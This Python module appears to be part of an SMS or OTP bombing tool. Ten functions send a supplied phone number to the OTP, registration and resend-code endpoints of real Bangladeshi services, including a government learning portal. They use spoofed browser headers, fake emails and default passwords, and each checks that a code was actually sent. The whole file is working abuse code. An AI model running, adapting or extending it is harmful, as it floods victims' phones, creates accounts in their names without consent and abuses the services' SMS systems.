import requests
from .utils import send_request, get_random_user_agent

def api_31(number, egen, name):
    try:
        url_home = "https://go.paperfly.com.bd/"
        headers_home = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        response_home = requests.get(url_home, headers=headers_home, timeout=None)
        cookies = response_home.cookies.get_dict()
        
        url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
            'content-type': 'application/json',
            'device_identifier': 'undefined',
            'device_name': 'undefined',
            'dnt': '1',
            'origin': 'https://go.paperfly.com.bd',
            'priority': 'u=1, i',
            'referer': 'https://go.paperfly.com.bd/',
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': get_random_user_agent(),
        }
        data = {
            'full_name': name,
            'company_name': 'none',
            'email_address': f'{egen}@gmail.com',
            'phone_number': number,
        }
        response = send_request(url, "POST", headers, data, cookies)

        # Response Validation
        try:
            if response and response.status_code == 200:
                json_data = response.json()
                if json_data.get("message") == "Merchant Registration Successful !!":
                    return response
                else:
                    print(f"api_31 Validation Failed: {json_data}")
                    response.status_code = 400
                    return response
        except Exception as e:
            print(f"api_31 Validation Error: {e}")

        return response
    except Exception as e:
        print(f"API 31 error: {e}")
        return None

def api_32(number):
    url = 'https://backend.shopstick.com.bd/api/auth/send-otp'
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://shopstick.com.bd',
        'priority': 'u=1, i',
        'referer': 'https://shopstick.com.bd/',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        'x-device-id': '953d2b99-ac20-47c5-bbfc-8dfb04bf5f09',
    }
    
    data = {
        'value': f'+88{number}',
        'type': 'phone',
        'action': 'register',
    }
    
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("error") is False and json_data.get("msg") == "OTP sent successfully":
                return response
            else:
                print(f"api_32 Validation Failed: {json_data}")
                if response: response.status_code = 400
                return response
    except Exception as e:
        print(f"api_32 Validation Error: {e}")

    return response

def api_33(number, pgen=None, name=None):
    url = "https://api.volthbd.com/api/v1/auth/registration"
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'authorization': 'Bearer %changeMyMindYOO<>/',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.volthbd.com',
        'priority': 'u=1, i',
        'referer': 'https://www.volthbd.com/',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
    }
    data = {
        'firstName': name if name else 'Raisul',
        'phoneNumber': number,
        'password': pgen if pgen else 'rai@12345!Roy',
        'affiliateRef': None,
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    success = False
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("message") == "User registered successfully":
                success = True
                # GET call after success
                requests.get(f"https://www.volthbd.com/otpPages/{number}?_rsc=1x908", headers={'User-Agent': headers['user-agent']})
                return response
    except Exception as e:
        print(f"api_33 Registration Validation Error: {e}")

    # Fallback to Resend OTP if registration fails
    if not success:
        resend_url = 'https://api.volthbd.com/api/v1/auth/resendOtp'
        resend_data = {'phoneNumber': number}
        response = send_request(resend_url, "POST", headers, resend_data)
        try:
            if response and response.status_code == 200:
                json_data = response.json()
                if json_data.get("success") == "OTP resent successfully":
                    return response
        except Exception as e:
            print(f"api_33 Resend Validation Error: {e}")

    return response

def api_34(number):
    url = "https://api.ostad.app/api/v2/user/with-otp"
    headers = {
        "Host": "api.ostad.app",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Metadata": "{\"browser\":{\"name\":\"Chrome\",\"version\":\"139.0.0.0\",\"major\":\"139\"},\"cpu\":{\"architecture\":\"amd64\"},\"device\":{},\"engine\":{\"name\":\"Blink\",\"version\":\"139.0.0.0\"},\"os\":{\"name\":\"Windows\",\"version\":\"10\"},\"displayResolution\":{\"width\":1440,\"height\":900},\"deviceType\":\"web\",\"domain\":\"ostad.app\",\"brand\":\"Chrome\",\"model\":\"Windows\"}",
        "User-Agent": get_random_user_agent(),
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://ostad.app",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://ostad.app/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"msisdn": number}
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("code") == 200 and json_data.get("status") == "success":
                return response
            else:
                print(f"api_34 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_34 Validation Error: {e}")

    return response

def api_35(number):
    url = "https://api.arogga.com/auth/v1/sms/send/"
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'dnt': '1',
        'origin': 'https://www.arogga.com',
        'priority': 'u=1, i',
        'referer': 'https://www.arogga.com/',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
    }
    
    params = {
        'f': 'web',
        'b': 'Chrome',
        'v': '144.0.0.0',
        'os': 'Windows',
        'osv': '10',
    }
    
    files = {
        'mobile': (None, number),
        'fcmToken': (None, ''),
        'referral': (None, ''),
    }
    
    response = requests.post(url, headers=headers, params=params, files=files)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") == "success" and json_data.get("message") == "SMS sent to your mobile number":
                return response
            else:
                print(f"api_35 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_35 Validation Error: {e}")

    return response

def api_36(number):
    url = "https://auth.acsfutureschool.com/api/v1/otp/send"
    headers = {
        "Host": "auth.acsfutureschool.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://www.acsfutureschool.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.acsfutureschool.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"phone": number}
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("message") == "OTP sent!!":
                return response
            else:
                print(f"api_36 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_36 Validation Error: {e}")

    return response

def api_37(number, pgen=None, egen=None, name=None):
    url = "https://api.premiumfruitbd.com/auth/login/otp_send"
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'Origin': 'https://premiumfruitbd.com',
        'Referer': 'https://premiumfruitbd.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'token': 'null',
    }
    
    data = {
        'phone': number,
    }
    
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("message") == "OTP Sent!":
                return response
            else:
                print(f"api_37 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_37 Validation Error: {e}")

    return response

def api_38(number):
    url = "https://api.busbd.com.bd/api/access-code"
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://busbd.com.bd',
        'priority': 'u=1, i',
        'referer': 'https://busbd.com.bd/',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': get_random_user_agent(),
    }
    data = {
        'phone': f'+88{number}',
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("message") == "otp generated.":
                return response
            else:
                print(f"api_38 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_38 Validation Error: {e}")

    return response

def api_39(number, pgen, egen, name):
    url = "https://api.muktopaath.gov.bd/my-account/user/register"
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://muktopaath.gov.bd',
        'priority': 'u=1, i',
        'referer': 'https://muktopaath.gov.bd/',
        'roleid': 'muktopaath',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
    }
    
    data = {
        'name': name,
        'certificate_name': 'rox',
        'profession_id': 2,
        'email': number, # Using number as email as per request example '0177...'
        'gender': '1',
        'password': pgen,
        'disability_id': 0,
        'has_disability': 0,
        'password_confirmation': pgen,
        'profession_type': '3',
    }
    
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") is True and json_data.get("code") == "REGISTRATION_SUCCESS":
                return response
            elif json_data.get("code") == "NOT_VERIFIED":
                # Fallback to Resend Code
                resend_url = "https://api.muktopaath.gov.bd/my-account/verify/resend_code"
                resend_data = {'user': number}
                resend_response = send_request(resend_url, "POST", headers, resend_data)
                
                if resend_response and resend_response.status_code == 200:
                    resend_json = resend_response.json()
                    if resend_json.get("error") is False and resend_json.get("code") == "RESEND_OTP_SEND":
                        return resend_response
                    else:
                        print(f"api_39 Resend Failed: {resend_json}")
                        resend_response.status_code = 400
                        return resend_response
                return resend_response
            else:
                print(f"api_39 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_39 Validation Error: {e}")

    return response

def api_40(number):
    url = "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code"
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.hoichoi.tv',
        'priority': 'u=1, i',
        'referer': 'https://www.hoichoi.tv/',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': get_random_user_agent(),
    }
    data = {
        'phoneNumber': f'+88{number}',
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") == "OK":
                return response
            else:
                print(f"api_40 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_40 Validation Error: {e}")

    return response
